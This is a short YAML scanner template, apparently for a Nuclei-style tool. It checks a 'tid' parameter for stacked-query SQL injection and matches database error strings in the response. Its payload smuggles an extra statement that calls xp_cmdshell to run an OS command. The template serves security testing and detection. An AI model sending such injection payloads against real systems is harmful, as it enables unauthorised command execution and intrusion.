id: sqli3-stacked-060
name: 'Stacked query in tid'
severity: critical
type: active
tags:
  - sqli
  - injection
  - stacked
description: 'Extra SQL statement via tid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      tid:
        - '1''; EXEC xp_cmdshell(''id'')--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
